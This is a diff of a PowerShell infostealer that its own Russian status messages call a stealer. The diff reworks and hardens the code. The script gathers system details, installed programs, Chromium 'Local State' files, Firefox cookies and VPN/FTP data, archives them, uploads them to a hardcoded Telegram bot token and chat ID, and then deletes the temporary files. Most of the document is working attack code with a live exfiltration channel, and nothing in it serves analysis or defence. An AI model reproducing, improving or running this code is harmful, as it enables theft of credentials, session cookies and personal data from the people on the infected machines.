@@ -1,4 +1,3 @@
-# === ПЕРЕМЕННЫЕ И СООБЩЕНИЯ ===
 $messages = @{
     Start = "Запуск стиллера...";
     SystemCollect = "Сбор информации о системе";
@@ -20,8 +19,6 @@ $BotToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
 $ChatID = "1266539824"
 
 Add-Type -Assembly System.IO.Compression.FileSystem
-
-# === ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===
 
 function WriteMsg($key) {
     if ($messages.ContainsKey($key)) {
@@ -72,17 +69,8 @@ function Send-ResultToTelegram {
         [string]$BotToken,
         [string]$ChatID,
         [string]$ZipPath,
-        [string]$SystemInfoPath
+        [string]$Caption
     )
-    
-    $caption = "Data Package"
-    if ((Test-Path $SystemInfoPath) -and ((Get-Item $SystemInfoPath).Length -gt 0)) {
-        try {
-            $caption = Get-Content $SystemInfoPath -Raw -ErrorAction Stop
-        } catch {
-            $caption = "Data Package (info unavailable)"
-        }
-    }
     
     $url = "https://api.telegram.org/bot$BotToken/sendDocument"
     try {
@@ -95,7 +83,9 @@ function Send-ResultToTelegram {
         $form = New-Object System.Net.Http.MultipartFormDataContent
         $form.Add($fileContent, "document", $fileName)
         $form.Add((New-Object System.Net.Http.StringContent($ChatID)), "chat_id")
-        $form.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
+        if ($Caption) {
+            $form.Add((New-Object System.Net.Http.StringContent($Caption)), "caption")
+        }
         
         $client = New-Object System.Net.Http.HttpClient
         $response = $client.PostAsync($url, $form).Result
@@ -116,30 +106,40 @@ function Send-ResultToTelegram {
     }
 }
 
-# === ФУНКЦИИ СБОРА ДАННЫХ ===
-
 function Get-SystemInfo {
     param([string]$OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
     
-    $ipConfig = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Select-Object IPAddress
+    $ipConfig = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty IPAddress
     $externalIp = try { 
         (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5 -ErrorAction Stop).Trim() 
     } catch { 
         "N/A" 
     }
     
-    $userInfo = "Username: $($env:USERNAME)`r`nComputerName: $($env:COMPUTERNAME)`r`nLocal IP: $($ipConfig.IPAddress -join ', ')`r`nExternal IP: $externalIp"
+    $localIPStr = ($ipConfig -join ", ")
+    $userInfo = @"
+Username: $($env:USERNAME)
+ComputerName: $($env:COMPUTERNAME)
+Local IP: $localIPStr
+External IP: $externalIp
+"@
     $userInfo | Out-File "$OutDirectory\user_info.txt" -Force -Encoding UTF8
     
-    $sysInfo = @{
-        OS = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
-        Version = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Version
-        Architecture = $env:PROCESSOR_ARCHITECTURE
-        RAM_GB = [Math]::Round((Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 2)
-        CPU = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue).Name
-    }
-    $sysInfo | Out-File "$OutDirectory\computer_info.txt" -Force -Encoding UTF8
+    try {
+        $osInfo = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
+        $cpuInfo = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
+        $sysInfo = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
+        
+        $sysInfoStr = @"
+OS: $($osInfo.Caption)
+Version: $($osInfo.Version)
+Architecture: $env:PROCESSOR_ARCHITECTURE
+RAM: $([Math]::Round($sysInfo.TotalPhysicalMemory / 1GB, 2)) GB
+CPU: $($cpuInfo.Name)
+"@
+        $sysInfoStr | Out-File "$OutDirectory\computer_info.txt" -Force -Encoding UTF8
+    } catch {}
     
     try {
         Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue | 
@@ -175,7 +175,6 @@ function Get-BrowserData {
     New-Item -Path $chromiumDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
     New-Item -Path $firefoxDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
     
-    # Chromium browsers
     $browsers = @(
         @{Path="$env:LOCALAPPDATA\Google\Chrome\User Data"; Name="Chrome"},
         @{Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data"; Name="Edge"},
@@ -188,12 +187,14 @@ function Get-BrowserData {
             $browserOutDir = "$chromiumDir\$($browser.Name)"
             New-Item -Path $browserOutDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
             try {
-                Copy-Item "$($browser.Path)\Local State" -Destination "$browserOutDir\" -Force -ErrorAction SilentlyContinue
+                $localStatePath = "$($browser.Path)\Local State"
+                if (Test-Path $localStatePath) {
+                    Copy-Item $localStatePath -Destination "$browserOutDir\" -Force -ErrorAction SilentlyContinue
+                }
             } catch {}
         }
     }
     
-    # Firefox
     $profilesIni = "$env:APPDATA\Mozilla\Firefox\profiles.ini"
     if (Test-Path $profilesIni) {
         try {
@@ -204,7 +205,10 @@ function Get-BrowserData {
                     $profileOutDir = "$firefoxDir\$profile"
                     New-Item -Path $profileOutDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
                     try {
-                        Copy-Item "$profilePath\cookies.sqlite" -Destination "$profileOutDir\" -Force -ErrorAction SilentlyContinue
+                        $cookiePath = "$profilePath\cookies.sqlite"
+                        if (Test-Path $cookiePath) {
+                            Copy-Item $cookiePath -Destination "$profileOutDir\" -Force -ErrorAction SilentlyContinue
+                        }
                     } catch {}
                 }
             }
@@ -365,8 +369,6 @@ function Get-VpnFtpData {
     }
 }
 
-# === ГЛАВНАЯ ФУНКЦИЯ ===
-
 function Start-Execution {
     WriteMsg "Start"
     $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
@@ -410,20 +412,32 @@ function Start-Execution {
             $false
         )
     } catch {
-        Write-Host "Archive creation failed: $_"
+        Write-Host "Archive error: $_"
         Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
         return
     }
 
-    $maxTelegramMB = 49
     $zipSizeMB = [Math]::Round((Get-Item $zipPath -ErrorAction SilentlyContinue).Length / 1MB, 2)
     
     WriteMsg "TelegramSend"
     
     $systemInfoPath = "$tempDir\System\user_info.txt"
+    $caption = ""
+    
+    if (Test-Path $systemInfoPath) {
+        try {
+            $caption = Get-Content $systemInfoPath -Raw -ErrorAction Stop
+        } catch {
+            $caption = "System info file exists but cannot be read"
+        }
+    } else {
+        $caption = "System info not available"
+    }
+    
+    $maxTelegramMB = 49
     
     if ($zipSizeMB -le $maxTelegramMB) {
-        $ok = Send-ResultToTelegram $BotToken $ChatID $zipPath $systemInfoPath
+        $ok = Send-ResultToTelegram $BotToken $ChatID $zipPath $caption
         if ($ok) { 
             WriteMsg "Success" 
         } else { 
@@ -433,7 +447,7 @@ function Start-Execution {
         $parts = Split-File -FilePath $zipPath -PartSizeMB $maxTelegramMB
         $allOk = $true
         foreach ($pt in $parts) {
-            $ok = Send-ResultToTelegram $BotToken $ChatID $pt $systemInfoPath
+            $ok = Send-ResultToTelegram $BotToken $ChatID $pt $caption
             if (-not $ok) { 
                 $allOk = $false 
             }
@@ -443,19 +457,16 @@ function Start-Execution {
         } else { 
             WriteMsg "FailSend" 
         }
-    }
-    
-    Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
-    Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
-    
-    if ($parts) {
+        
         foreach ($pt in $parts) {
             Remove-Item -Path $pt -Force -ErrorAction SilentlyContinue
         }
     }
     
+    Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
+    Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
+    
     WriteMsg "Finished"
 }
 
-# === ЗАПУСК ===
 Start-Execution
